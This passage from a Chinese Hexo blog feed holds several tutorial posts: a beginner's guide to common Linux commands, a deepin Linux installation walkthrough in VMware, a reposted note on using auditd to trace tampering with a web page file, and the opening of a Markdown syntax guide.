[b]<br>字符设备文件<br>字符设备文件：即串行端口的接口设备，例如键盘、鼠标等等。第一个属性为 [c]<br>套接字文件<br>这类文件通常用在网络数据连接，主要用于网络通信，套接字也可以是一台主机上的进程之间的通信。可以启动一个程序来监听客户端的要求，客户端就可以通过套接字来进行数据通信。第一个属性为 [s]，最常在 /var/run目录中看到这种文件类型</p></li><li></li><li><p>man</p></li><li><p>man命令是Linux下的帮助指令，通过man指令可以查看Linux中的指令帮助、配置文件帮助和编程帮助等信息。</p></li><li><p>例如 man ls 就会列出关于ls命令用法、信息等</p></li><li><p>/ 要搜索的内容 从上往下找</p></li><li><p>? 要搜索的内容 从下往上找</p></li><li></li><li><p>三、<a href="https://cscwdxgg.github.io/2019/09/20/linux%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/" target="_blank" rel="noopener">常用端口</a></p></li><li></li><li><p>四、管道 |</p></li><li><p>管道：一个命令的输出可以通过管道做为另一个命令的输入。</p></li><li><p>“|”是管道命令操作符，简称管道符。利用Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推。</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/641.png" alt="img"></p></li><li><p>例如：ls -lah | more、、、、man ls | more</p></li><li><p>（-lah显示目录下的所有文件</p></li><li><p>more命令是一个基于vi编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持vi中的关键字定位操作。more名单中内置了若干快捷键，常用的有H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。）</p></li><li></li><li><p>五、ln命令</p></li><li><p>Linux ln命令是一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。</p></li><li><p>当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</p></li><li></li><li><p>六、 vi 文本编辑器 vim</p></li><li><p>i：在当前字符前插入文本，进入插入模式</p></li><li><p>Esc：从编辑模式切换到命令模式；</p></li><li><p>wq：在命令模式下，执行存盘退出操作；</p></li><li><p>w：在命令模式下，执行存盘操作；</p></li><li><p>w！：在命令模式下，执行强制存盘操作；</p></li><li><p>q：在命令模式下，执行退出vi操作；</p></li><li><p>q！：在命令模式下，执行强制退出vi操作；</p></li><li></li><li></li><li></li><li><p>七、cd命令 切换工作目录至…</p></li><li><p>cd 进入用户主目录；</p></li><li><p>cd ~ 进入用户主目录；</p></li><li><p>cd - 返回进入此目录之前所在的目录；</p></li><li><p>cd .. 返回上级目录（若当前目录为“/“，则执行完后还在“/“；”..”为上级目录的意思）；</p></li><li><p>cd ../.. 返回上两级目录；</p></li><li></li><li><p>八、pwd 查看当前目录</p></li><li></li><li><p>九、which命令</p></li><li><p>使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。</p></li><li></li><li><p>十、whatis命令</p></li><li><p>是用于查询一个命令执行什么功能，并将查询结果打印到终端上。</p></li><li></li><li><p>十一、file命令</p></li><li><p>查看文件信息 例如file a.txt</p></li><li></li><li><p>十二、根目录下的文件</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/642.png" alt="img"></p></li><li><p>/：处于树形结构的最顶端。</p></li><li><p>/bin：存放所有用户都可使用的linux基本操作命令</p></li><li><p>/dev：设备文件目录，虚拟文件系统。</p></li><li><p>/home：默认存放用户的宿主目录(除了root用户)。</p></li><li><p>/misc：自动挂载服务目录，对应autofs服务。</p></li><li><p>/proc：虚拟文件系统，不能建立和删除文件。</p></li><li><p>/usr：安装除操作系统本身外应用程序或组件。</p></li><li><p>/boot：存放开机启动加载程序的核心文件</p></li><li><p>/etc：主机、系统或网络配置文件存放目录。</p></li><li><p>/media：移动存储设备默认挂载点。(如光盘)。</p></li><li><p>/root：管理员root的宿主目录。</p></li><li><p>/tmp：临时文件存放区域。</p></li><li><p>/var：动态文件或数据存放目录，默认日志文件都存放在这个目录下，建议单独划分一个分区。</p></li><li><p>/sbin：系统管理相关的二进制文件存放在这个目录下（多数管理命令默认只有管理员可以使用）</p></li><li><p>/bin：存放最常用命令；</p></li><li><p>/boot：启动Linux的核心文件；</p></li><li><p>/dev：设备文件；</p></li><li><p>/etc：存放各种配置文件；</p></li><li><p>/home：用户主目录；</p></li><li><p>/lib：系统最基本的动态链接共享库；</p></li><li><p>/mnt：一般是空的，用来临时挂载别的文件系统；</p></li><li><p>/proc：虚拟目录，是内存的映射；</p></li><li><p>/sbin：系统管理员命令存放目录；</p></li><li><p>/usr：最大的目录，存放应用程序和文件；</p></li><li><p>/usr/X11R6：X-Window目录；</p></li><li><p>/usr/src：Linux源代码；</p></li><li><p>/usr/include：系统头文件；</p></li><li><p>/usr/lib：存放常用动态链接共享库、静态档案库；</p></li><li><p>/usr/bin、/usr/sbin：这是对/bin、/sbin的一个补充</p></li><li></li><li><p>十三、cat命令</p></li><li><p>cat 命令用于连接文件并打印到标准输出设备上。</p></li><li><p>将文件1.2的内容放在文件3中去：</p></li><li><p>cat -X 文件1 文件2 &gt; 文件3 （如果文件3里有内容，则3中内容被覆盖）</p></li><li><p>cat -X 文件1 文件2 &gt;&gt; 文件3 （追加在文件3内容后面，不会覆盖）</p></li><li><p>​    -n 或 –number：由 1 开始对所有输出的行数编号。</p></li><li><p>-b 或 –number-nonblank：和 -n 相似，只不过对于空白行不编号。</p></li><li><p>-s 或 –squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行。</p></li><li><p>清空文件内容：cat /dev/null &gt; 文件 例如：cat /dev/null &gt; /etc/test.txt</p></li><li></li><li><p>十四、cp命令</p></li><li><p>cp命令用来将一个或多个源文件或者目录复制到指定的目的文件或目录。</p></li><li><p>cp -X 文件 要复制到的目录/新文件名 例如：cp test.py Music/01_test.py</p></li><li><p>(但是注意，若要复制的目标文件夹下已有相同文件名的文件，原文件将被覆盖，不会提示)</p></li><li><p>-f 当文件重名时，强制覆盖</p></li><li><p>-r 递归复制，将一个目录里的所有文件，复制到另一个目录里 例如：cp -r /bin/sg /etc/jh</p></li><li><p>-b 当文件重名时，备份一份</p></li><li><p>-i 当文件重名时，会提示要不要覆盖</p></li><li></li><li><p>十五、rm命令</p></li><li><p>rm命令可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉。对于链接文件，只是删除整个链接文件，而原有文件保持不变。</p></li><li><p>rm -X 要删除的文件</p></li><li><p>-d：直接把欲删除的目录的硬连接数据删除成0，删除该目录；删除有可能存在文件</p></li><li><p>-f：强制删除文件或目录；</p></li><li><p>-i：删除已有文件或目录之前先询问用户；</p></li><li><p>-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；</p></li><li><p>-v：显示指令的详细执行过程。</p></li><li></li><li><p>十六、mv命令</p></li><li><p>mv命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。</p></li><li><p>-b：当文件存在时，覆盖前，为其创建一个备份；</p></li><li><p>-f：若目标文件或目录与现有的文件或目录重复，则直接覆盖现有的文件或目录；</p></li><li><p>-i：交互式操作，覆盖前先行询问用户，如果源文件与目标文件或目标目录中的文件同名，则询问用户是否覆盖目标文件。用户输入”y”，表示将覆盖目标文件；输入”n”，表示取消对源文件的移动。这样可以避免误将文件覆盖。</p></li><li><p>例如：1、将文件重命名将文件ex3改名为new1</p></li><li><p>mv ex3 new1</p></li><li><p>将目录/usr/men中的所有文件移到当前目录（用.表示）中：</p></li><li><p>mv /usr/men/* .</p></li><li></li><li><p>十七、chmod命令——用来变更文件或目录的权限</p></li><li><p>权限范围的表示法如下：</p></li><li><p>u User，即文件或目录的拥有者；<br>g Group，即文件或目录的所属群组；<br>o Other，除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围；<br>a All，即全部的用户，包含拥有者，所属群组以及其他用户；<br>r 读取权限，数字代号为“4”;<br>w 写入权限，数字代号为“2”；<br>x 执行或切换权限，数字代号为“1”；<br>- 不具任何权限，数字代号为“0”；<br>s 特殊功能说明：变更文件或目录的权限。</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/643.png" alt="img"></p></li><li><p>例如：</p></li><li><p>chmod u+x,g+w f01　　//为文件f01设置自己可以执行，组员可以写入的权限</p></li><li><p>chmod u=rwx,g=rw,o=r f01</p></li><li><p>chmod 764 f01</p></li><li><p>chmod a+x f01　　//对文件f01的u,g,o都设置可执行属性</p></li><li><p>十八、mkdir命令——用来创建目录</p></li><li><p>-m：建立目录的同时设置目录的权限</p></li><li><p>例如：mkdir -m 777 da</p></li><li><p>-p：若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录</p></li><li><p>例如：mkdir -p-m 750 bin/os_1</p></li><li><p>在当前目录中建立bin和bin下的os_1目录，权限设置为文件主可读、写、执行，同组用户可读和执行，其他用户无权访问</p></li><li></li><li></li><li><p>十九、touth文件</p></li><li><p>有两个功能：一是用于把已存在文件的时间标签更新为系统当前的时间（默认方式），它们的数据将原封不动地保留下来；二是用来创建新的空文件。</p></li><li><p>-a：只更改存取时间；</p></li><li><p>-d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间；</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/644.png" alt="img"></p></li><li></li><li></li><li><p>二十、tree命令——以树状图列出目录的内容</p></li><li></li><li><p>二十一、ps命令——用于报告当前系统的进程状态</p></li><li></li><li><p>二十二、find命令——用来在指定目录下查找文件</p></li><li><p>find 文件夹 -name 查找目标 例如:find / -name aba,txt（当不知道在什么文件夹下时可用根目录）</p></li><li><p>find 文件夹 -iname 查找目标 (同上，但不区分大小写)</p></li><li><p>find . 列出当前目录及子目录下所有文件和文件夹</p></li><li></li><li><p>二十三、locate命令——用来查找文件或目录，比find快</p></li><li><p>搜索etc目录下所有以sh开头的文件：</p></li><li><p>locate /etc/sh</p></li><li><p>搜索用户主目录下，所有以m开头的文件：</p></li><li><p>locate ~/m</p></li><li><p>搜索用户主目录下，所有以m开头的文件，并且忽略大小写：</p></li><li><p>locate -i ~/m</p></li><li></li><li><p>二十四、head——用于显示文件的开头的内容。默认显示文件的头10行内容。</p></li><li><p>例如：man ls | head</p></li><li><p>若要指定看多少行，则：head -n 行数</p></li><li></li><li><p>二十五、less命令</p></li><li><p>less命令的作用与more十分相似，都可以用来浏览文字档案的内容，不同的是less命令允许用户向前或向后浏览文件，而more命令只能向前浏览。用less命令显示文件时，用PageUp键向上翻页，用PageDown键向下翻页。要退出less程序，应按Q键。</p></li></ul><blockquote><p>原创： KeJiTun <a href="https://mp.weixin.qq.com/s/O0yVykqApF9gawkeHDKlPw" target="_blank" rel="noopener">渗透云笔记</a> </p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux常用指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>deepin linux详细安装教程</title>
      <link href="/2019/09/19/deepin-linux-xiang-xi-an-zhuang-jiao-cheng/"/>
      <url>/2019/09/19/deepin-linux-xiang-xi-an-zhuang-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00准备的物料"><a href="#0x00准备的物料" class="headerlink" title="0x00准备的物料"></a>0x00准备的物料</h2><p>1.工具VMware,其他虚拟机设备也可以大同小异（物理机必须是64位的，32位的我没安装成功。成功了也有问题。或许大佬能解决！）</p><p>工具链接: <a href="https://pan.baidu.com/s/1aHpq48vuJDpKFm2M7bRRpw" target="_blank" rel="noopener">https://pan.baidu.com/s/1aHpq48vuJDpKFm2M7bRRpw</a> 提取码: 7ab2</p><p>秘玥链接: <a href="https://pan.baidu.com/s/1DHk2-EM9owfKVyxLjHPbAQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1DHk2-EM9owfKVyxLjHPbAQ</a> 提取码: 2s92</p><p>2.deepin镜像文件</p><p>深度社区<a href="https://www.deepin.org/download/" target="_blank" rel="noopener">https://www.deepin.org/download/</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568872338333.png" alt="1568872338333"></p><p>我选择的是百度云因为下的比较快，密码就是图上的xcaw</p><h2 id="0x01开始安装"><a href="#0x01开始安装" class="headerlink" title="0x01开始安装"></a>0x01开始安装</h2><h5 id="1-首先安装VMware虚拟机，百度教程很多。再不会可以私信我。"><a href="#1-首先安装VMware虚拟机，百度教程很多。再不会可以私信我。" class="headerlink" title="1.首先安装VMware虚拟机，百度教程很多。再不会可以私信我。"></a>1.首先安装VMware虚拟机，百度教程很多。再不会可以私信我。</h5><h5 id="2-镜像下载完如图所示"><a href="#2-镜像下载完如图所示" class="headerlink" title="2.镜像下载完如图所示"></a>2.镜像下载完如图所示</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568872659540.png" alt="1568872659540"></p><h5 id="3-打开VMware，点击创建新的虚拟机。"><a href="#3-打开VMware，点击创建新的虚拟机。" class="headerlink" title="3.打开VMware，点击创建新的虚拟机。"></a>3.打开VMware，点击创建新的虚拟机。</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568872736088.png" alt="1568872736088"></p><h5 id="4-选择典型，点击下一步。"><a href="#4-选择典型，点击下一步。" class="headerlink" title="4.选择典型，点击下一步。"></a>4.选择典型，点击下一步。</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568872798265.png" alt="1568872798265"></p><h5 id="5-继续点击下一步。"><a href="#5-继续点击下一步。" class="headerlink" title="5.继续点击下一步。"></a>5.继续点击下一步。</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568872856016.png" alt="1568872856016"></p><h5 id="6-点击linux，选择-Ubunyu-64位-点击下一步。"><a href="#6-点击linux，选择-Ubunyu-64位-点击下一步。" class="headerlink" title="6.点击linux，选择    Ubunyu 64位,点击下一步。"></a>6.点击linux，选择    Ubunyu 64位,点击下一步。</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568872949194.png" alt="1568872949194"></p><h5 id="7-虚拟机名称deepin可随便添，位置根据自己电脑情况选一个网盘根目录新建一个文件夹。我放在f盘的deepin目录中。点下一步。"><a href="#7-虚拟机名称deepin可随便添，位置根据自己电脑情况选一个网盘根目录新建一个文件夹。我放在f盘的deepin目录中。点下一步。" class="headerlink" title="7.虚拟机名称deepin可随便添，位置根据自己电脑情况选一个网盘根目录新建一个文件夹。我放在f盘的deepin目录中。点下一步。"></a>7.虚拟机名称deepin可随便添，位置根据自己电脑情况选一个网盘根目录新建一个文件夹。我放在f盘的deepin目录中。点下一步。</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568873164607.png" alt="1568873164607"></p><h5 id="8-磁盘改大一点，改成60GB或更大。点下一步。"><a href="#8-磁盘改大一点，改成60GB或更大。点下一步。" class="headerlink" title="8.磁盘改大一点，改成60GB或更大。点下一步。"></a>8.磁盘改大一点，改成60GB或更大。点下一步。</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568873323911.png" alt="1568873323911"></p><h5 id="9-点击自定义硬件"><a href="#9-点击自定义硬件" class="headerlink" title="9.点击自定义硬件"></a>9.点击自定义硬件</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568873354463.png" alt="1568873354463"></p><p>处理器改成2安装的快一点</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568873394527.png" alt="1568873394527"></p><p>这一步比较重要，选择iso映像文件浏览选择你下载的deepin-15.11-amd64.iso文件。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568873519199.png" alt="1568873519199"></p><p>网络适配选择桥接模式。点击关闭</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568873698002.png" alt="1568873698002"></p><p>然后点击完成</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568873759737.png" alt="1568873759737"></p><p>10.点击开始此虚拟机</p><p>不用管他自己安装，到这里选择中文，点击阅读并同意。下一步，继续安装</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568873891628.png" alt="1568873891628"></p><p>11.设置用户，及密码。然后点击下一步</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568874032315.png" alt="1568874032315"></p><p>12.直接下一步</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568874124641.png" alt="1568874124641"></p><p>13.选择简单，点击安装。下面就是等待。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568874188623.png" alt="1568874188623"></p><p>14.安装完成重启后，输入密码。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/img/1568876793249.png" alt="1568876793249"></p><p>15.安装完成后面自己折腾去吧。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deepin linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TRICK: Linux Auditd审计工具</title>
      <link href="/2019/09/16/trick-linux-auditd-shen-ji-gong-ju/"/>
      <url>/2019/09/16/trick-linux-auditd-shen-ji-gong-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近我的网站首页被挂搜索引擎劫持了，输入域名打开正常。通过site:域名，发现网站被劫持了。然后想起key大佬有篇文章好像有类似的工具，如下全搬过来了。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>难题：/home/chen/test/目录下的index.html为首页文件，一直被入侵者恶意篡改</p><p>需求：想要定位攻击方式以及篡改方式</p><p>命令：<code>auditctl</code> （安装：<code>sudo apt install auditd</code>）</p><p>参数：</p><pre><code>-w 监控文件路径-p 监控文件筛选 r(读) w(写) x(执行) a(属性改变)-k 关键词（用于查询监控日志）</code></pre><p>运行：<code>sudo auditctl -w /home/chen/test/index.html -p w -k index</code>，等待二次篡改</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>发现被篡改执行：<code>sudo ausearch -i -k index</code> 查看日志</p><pre><code>type=SYSCALL msg=audit(08/20/2019 02:22:10.905:509) : arch=x86_64 syscall=rename success=yes exit=0 a0=0x7f5c94011370 a1=0x7f5c94005d90 a2=0x0 a3=0x20 items=5 ppid=1966 pid=17243 auid=chen uid=chen gid=chen euid=chen suid=chen fsuid=chen egid=chen sgid=chen fsgid=chen tty=(none) ses=3 comm=pool exe=/usr/bin/gedit key=index </code></pre><p>了解该日志的格式：</p><pre><code>syscall : 相关的系统调用auid : 审计用户IDuid 和 gid : 访问文件的用户ID和用户组IDcomm : 用户访问文件的命令exe : 上面命令的可执行文件路径</code></pre><p>这里的<code>syscall</code>可以理解为是执行的动作，那么这段日志就非常容易理解了：用户chen使用<strong>gedit</strong> rename了该文件（重命名）</p><p>那么<code>syscall</code>是什么代表着编辑文件内容呢？（篡改）</p><p>测试<code>gedit</code>打开文件、编辑文件内容、保存文件，有三条日志：</p><pre><code>type=SYSCALL msg=audit(08/20/2019 02:22:10.897:506) : arch=x86_64 syscall=openat success=no exit=EEXIST(File exists) a0=0xffffff9c a1=0x7f5ca0009800 a2=O_WRONLY|O_CREAT|O_EXCL a3=0x1b6 items=2 ppid=1966 pid=17243 auid=chen uid=chen gid=chen euid=chen suid=chen fsuid=chen egid=chen sgid=chen fsgid=chen tty=(none) ses=3 comm=pool exe=/usr/bin/gedit key=index type=SYSCALL msg=audit(08/20/2019 02:22:10.897:507) : arch=x86_64 syscall=openat success=yes exit=17 a0=0xffffff9c a1=0x7f5ca0009800 a2=O_WRONLY|O_CREAT|O_NOFOLLOW a3=0x1b6 items=2 ppid=1966 pid=17243 auid=chen uid=chen gid=chen euid=chen suid=chen fsuid=chen egid=chen sgid=chen fsgid=chen tty=(none) ses=3 comm=pool exe=/usr/bin/gedit key=index type=SYSCALL msg=audit(08/20/2019 02:22:10.905:509) : arch=x86_64 syscall=rename success=yes exit=0 a0=0x7f5c94011370 a1=0x7f5c94005d90 a2=0x0 a3=0x20 items=5 ppid=1966 pid=17243 auid=chen uid=chen gid=chen euid=chen suid=chen fsuid=chen egid=chen sgid=chen fsgid=chen tty=(none) ses=3 comm=pool exe=/usr/bin/gedit key=index </code></pre><p>syscall分别为：<code>openat</code>、<code>openat</code>、<code>rename</code>，但注意到第一个<code>openat</code>的日志中的<code>success等于no</code></p><p>也就是说我们可以理解日志中出现<code>syscall=openat</code>即有人在修改文件，那么查看日志的命令就可以变成：</p><pre><code>sudo ausearch -i -k index | grep 'syscall=openat'</code></pre><p><strong>END</strong>：定位到了用户、进程就可以继续跟踪了。</p><blockquote><p><a href="https://gh0st.cn/archives/2019-08-20/1" target="_blank" rel="noopener">转载于key大佬博客</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux 审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo中Markdown语法(GFM)使用</title>
      <link href="/2019/09/15/hexo-zhong-markdown-yu-fa-gfm-shi-yong/"/>
      <url>/2019/09/15/hexo-zhong-markdown-yu-fa-gfm-shi-yong/</url>
      
        <content type="html"><![CDATA[<p><a href="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/013.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/013.jpg" alt="欢迎来访呀朋友">欢迎来访呀朋友</a></p><h1 id="1-Markdown语法"><a href="#1-Markdown语法" class="headerlink" title="1 Markdown语法"></a>1 Markdown语法</h1><h2 id="1-1-标题"><a href="#1-1-标题" class="headerlink" title="1.1 标题"></a>1.1 标题</h2><p>Markdown支持6种级别的标题，对应html标签 h1 ~ h6</p><p>复制</p><pre><code># h1   //一级标题 对应 &lt;h1&gt; &lt;/h1&gt;## h2   //二级标题 对应 &lt;h2&gt; &lt;/h2&gt;### h3  //三级标题 对应 &lt;h3&gt; &lt;/h3&gt;#### h4  //四级标题 对应 &lt;h4&gt; &lt;/h4&gt;##### h5  //五级标题 对应 &lt;h5&gt; &lt;/h5&gt;###### h6  //六级标题 对应 &lt;h6&gt; &lt;/h6&gt;</code></pre><h2 id="1-2-段落及区块引用"><a href="#1-2-段落及区块引用" class="headerlink" title="1.2 段落及区块引用"></a>1.2 段落及区块引用</h2><p>Markdown提供了一个特殊符号 &gt; 用于段首进行强调，被强调的文字部分将会高亮显示</p><p>复制</p><pre><code>&gt; 这段文字将会被高亮显示...</code></pre><p>以上标记显示效果如下：</p><p><a href="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/20190331144721.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/20190331144721.png" alt="img"></a></p><h2 id="1-3-插入链接或图片"><a href="#1-3-插入链接或图片" class="headerlink" title="1.3 插入链接或图片"></a>1.3 插入链接或图片</h2><p>Markdown针对链接和图片的处理也比较简单，可以使用下面的语法进行标记</p><p>复制</p><pre><code>[点击跳转至百度](https://www.baidu.com)![图片](https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/015.jpg)</code></pre><p>以上标记显示效果如下：</p><p><a href="https://www.baidu.com/" target="_blank" rel="noopener">点击跳转至百度</a><br><a href="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/015.jpg" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/015.jpg" alt="图片"></a></p><p><a href="https://raw.githubusercontent.com/wugenqiang/picGo/master/pictures/015.jpg" target="_blank" rel="noopener">图片</a></p><p>注： 引用图片和链接的唯一区别就是在最前方添加一个感叹号。</p><h2 id="1-4-列表"><a href="#1-4-列表" class="headerlink" title="1.4 列表"></a>1.4 列表</h2><p>Markdown支持有序列表和无序列表两种形式：</p><ul><li>无序列表使用 * 或 + 或 - 标识</li><li>有序列表使用数字加 . 标识，例如：1.</li></ul><h2 id="1-5-分隔线"><a href="#1-5-分隔线" class="headerlink" title="1.5 分隔线"></a>1.5 分隔线</h2><p>有时候，为了排版漂亮，可能会加入分隔线。Markdown加入分隔线非常简单，使用下面任意一种形式都可以</p><p>复制</p><pre><code>***---</code></pre><p>以上标记显示效果如下：</p><hr><hr><h2 id="1-6-内容强调"><a href="#1-6-内容强调" class="headerlink" title="1.6 内容强调"></a>1.6 内容强调</h2><p>有时候，我们对某一部分文字进行强调，使用 * 或 _ 包裹即可。使用单一符号标记的效果是斜体，使用两个符号标记的效果是加粗</p><p>复制</p><pre><code>*这里是斜体*_这里是斜体_**这里是加粗**__这里是加粗__***这里是加粗并斜体***___这里是加粗并斜体___</code></pre><p>以上标记显示效果如下：</p><p><em>这里是斜体</em><br><em>这里是斜体</em></p><p><strong>这里是加粗</strong><br><strong>这里是加粗</strong></p><p><strong>这里是加粗并斜体</strong><br><strong>这里是加粗并斜体</strong></p><h2 id="1-7-删除线"><a href="#1-7-删除线" class="headerlink" title="1.7 删除线"></a>1.7 删除线</h2><p>复制</p><pre><code>这样来 ~~删除一段文本~~</code></pre><p>以上标记显示效果如下：</p><p>这样来 删除一段文本</p><h2 id="1-8-高亮显示"><a href="#1-8-高亮显示" class="headerlink" title="1.8 高亮显示"></a>1.8 高亮显示</h2><p>复制</p><pre><code>使用&lt;code&gt;\`&lt;/code&gt;来强调字符//想打出 ` (反引号)需要转义，加&lt;code&gt;&lt;/code&gt;标签强调比如`突出背景色`来显示强调效果</code></pre><p>以上标记显示效果如下：</p><p>使用```来强调字符<br>比如 <code>突出背景色</code> 来显示强调效果</p><h2 id="1-9-嵌套引用"><a href="#1-9-嵌套引用" class="headerlink" title="1.9 嵌套引用"></a>1.9 嵌套引用</h2><p>复制</p><pre><code>&gt; 动物&gt;&gt; 水生动物&gt;&gt; 陆生动物&gt;&gt;&gt; 猴子&gt;&gt;&gt; 人&gt;&gt;&gt;&gt; 程序猿&gt;&gt;&gt;&gt; 攻城狮&gt;&gt;产品狗 //这里需要注意，没有空行间隔，忽略降级引用标记射鸡虱   //这里需要注意，没有空行间隔，忽略降级引用标记&gt;&gt; 两栖类动物&gt;&gt;&gt; 大鳄鱼唐老鸭两个回车结束引用,不在引用范围内了！</code></pre><p>以上标记显示效果如下：</p><blockquote><p>动物</p><blockquote><p>水生动物<br>陆生动物</p><blockquote><p>猴子<br>人</p><blockquote><p>程序猿<br>攻城狮<br>产品狗 